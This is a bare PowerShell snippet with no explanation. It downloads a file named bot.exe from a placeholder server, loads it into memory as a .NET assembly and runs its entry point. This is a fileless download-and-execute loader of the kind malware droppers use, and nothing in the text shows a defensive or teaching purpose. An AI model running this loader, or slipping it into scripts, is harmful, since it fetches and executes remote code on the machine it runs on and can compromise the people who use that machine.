$webclient = New-Object System.Net.WebClient
$bytes = $webclient.DownloadData("http://your-server.com/bot.exe")
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, @([String[]]@()))
